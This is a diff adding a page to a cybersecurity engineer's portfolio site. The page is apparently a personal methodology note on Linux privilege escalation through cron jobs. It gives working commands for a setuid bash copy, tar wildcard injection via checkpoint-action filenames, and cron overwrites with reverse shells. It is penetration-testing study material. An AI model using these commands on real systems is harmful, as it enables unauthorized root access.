@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <link rel="stylesheet" href="assets/css/swiper-bundle.min.css">
+
+    <!--==================== CSS ====================-->
+    <link rel="stylesheet" href="assets/css/method-styles.css">
+
+    <title>TITLE</title>
+</head>
+<body class="dark-theme">
+    <!--==================== HEADER ====================-->
+    <header class="header" id="header">
+        <nav class="nav container">
+            <a href="#" class="nav__logo">Tyler O'Hare</a>
+            <div class="nav__menu" id="nav-menu">
+                <ul class="nav__list grid">
+                    <li class="nav__item">
+                        <a href="#home" class="nav__link active-link">
+                            <i class="uil uil-estate nav__icon"></i> Home
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="#skills" class="nav__link">
+                            <i class="uil uil-file-alt nav__icon"></i> Skills
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="#portfolio" class="nav__link">
+                            <i class="uil uil-scenery nav__icon"></i> Portfolio
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="#contact" class="nav__link">
+                            <i class="uil uil-estate nav__icon"></i> Contact Me
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="nav__link">
+                            <i class="uil uil-estate nav__icon"></i> Methodology
+                        </a>
+                    </li>
+                </ul>
+                <i class="uil uil-times nav__close" id="nav-close"></i>
+            </div>
+
+            <div class="nav__btns">
+                <!--Theme change button-->
+                <i class="uil uil-moon change-theme" id="theme-button"></i>
+
+                <div class="nav__toggle" id="nav-toggle">
+                    <i class="uil uil-apps"></i>
+                </div>
+            </div>
+        </nav>
+    </header>
+    <!--==================== END-HEADER ====================-->
+
+
+<!--==================== MAIN ====================-->
+    <main class="main"><article id="3e54086d-b795-48d1-8a24-d30c9dc7a298" class="page sans"><header><h1 class="page-title">Scheduled Tasks</h1></header><div class="page-body"><p id="16037de2-a7cc-4e0a-bb73-189510cd0614" class=""><strong>See cronjobs:</strong></p><pre id="d85a5716-e690-45e7-9af8-d6bb2f62891c" class="code code-wrap"><code>cat /etc/crontab</code></pre><p id="409403d1-7958-411a-857c-e1b5edf160a3" class=""><strong>Systemd timers:</strong></p><ul id="c9c65720-b403-454d-aed5-1bab21d4676b" class="bulleted-list"><li style="list-style-type:disc">Payloads all the things if we cant manually see cronjobs</li></ul><pre id="c2028457-c715-4206-a81c-48d8d170abbd" class="code code-wrap"><code>systemctl list-timers -all</code></pre><p id="dfe430be-a9cd-471e-8140-99397eba9811" class=""><strong>Overwriting cron paths:</strong></p><pre id="cf2cf629-0e03-43f9-8078-6f0f0d069ac4" class="code"><code>#payload
+echo &#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27; &gt; /home/user/overwrite.sh</code></pre><p id="d1a48ea8-0fe5-4f65-94c7-3063f7d0803d" class="">wait for the cronjob to execute again...</p><pre id="36506a36-8ede-4075-a46c-960d9d49bb70" class="code code-wrap"><code>/tmp/bash -p</code></pre><p id="a22416bb-dc95-4578-9721-60e155c902ee" class=""><strong>Cron wildcards:</strong></p><ul id="0a6a57e3-dc0b-41f4-b891-7df6698ac8ad" class="bulleted-list"><li style="list-style-type:disc">we can inject code through * (wildcards)</li></ul><ul id="768c358f-c5b3-4679-b1b6-b734d60e5068" class="bulleted-list"><li style="list-style-type:disc">Commands depend on the program being ran by the cronjob</li></ul><p id="4f0f918f-03b8-4f67-b557-7851bc205fb7" class=""><strong>For tar wildcards:</strong></p><ul id="323a123a-7fd0-4209-8258-ac156964124f" class="bulleted-list"><li style="list-style-type:disc">create a reverse shell: <a href="http://shell.sh/">shell.sh</a></li></ul><pre id="b8cf42c6-a45b-4333-b63f-0bfe909da5fa" class="code code-wrap"><code>echo &#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27; &gt; shell.sh
+touch /home/user/dir/--checkpoint=1
+touch /home/user/dir/--checkpoint-action=exec=sh\shell.sh
+/tmp/bash -p</code></pre><p id="1e69d049-d868-46a5-85cb-6650618f27b4" class="">Another common escalation:</p><ul id="8e1cab6f-1f5a-442a-ac96-5ae38541f4af" class="bulleted-list"><li style="list-style-type:disc">When you see files running a cronjob</li></ul><ul id="18b2bb41-c7d8-45c3-9fb1-990e4d9e6642" class="bulleted-list"><li style="list-style-type:disc">Overwrite cronjob with reverse shells...</li></ul></div></article></main></main>
+
+    <!--==================== FOOTER ====================-->
+    <footer class="footer">
+        <div class="footer__bg">
+            <div class="footer__container container grid">
+                <div>
+                    <h1 class="footer__title">Tyler O'Hare</h1>
+                    <span class="footer__subtitle">Cybersecurity Engineer</span>
+                </div>
+
+                <ul class="footer__links">
+                    <li>
+                        <a href="#skills" class="footer__link">Skills</a>
+                    </li>
+
+                    <li>
+                        <a href="#portfolio" class="footer__link">Portfolio</a>
+                    </li>
+
+                    <li>
+                        <a href="#contact" class="footer__link">Contact</a>
+                    </li>
+                    <li>
+                        <a href="assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="footer__link">Methodology</a>
+                    </li>
+                </ul>
+
+                <div class="footer__socials">
+                    <a href="https://github.com/tyohare" target="_blank" class="footer__social">
+                        <i class="uil uil-github-alt"></i>
+                    </a>
+
+                    <a href="https://www.linkedin.com/in/tyler-ohare-72b26923a/" target="_blank" class="footer__social" class="footer__social">
+                        <i class="uil uil-linkedin-alt"></i>
+                    </a>
+                </div>
+            </div>
+
+            <p class="footer__copy">&#169; Tyler O'Hare. All rights reserved.</p>
+        </div>
+
+    </footer>
+    <!--==================== END-FOOTER ====================-->
+
+
+    <!--==================== SCROLL TOP ====================-->
+    <a href="" class="scrollup" id="scroll-up">
+        <i class="uil uil-arrow-up scroll__icon"></i>
+    </a>
+
+    <!--==================== SWIPER JS ====================-->
+    <script src="assets/js/swiper-bundle.min.js"></script>
+
+    <!--==================== MAIN JS ====================-->
+    <script src="assets/js/main.js"></script>
+</body>
+</html>
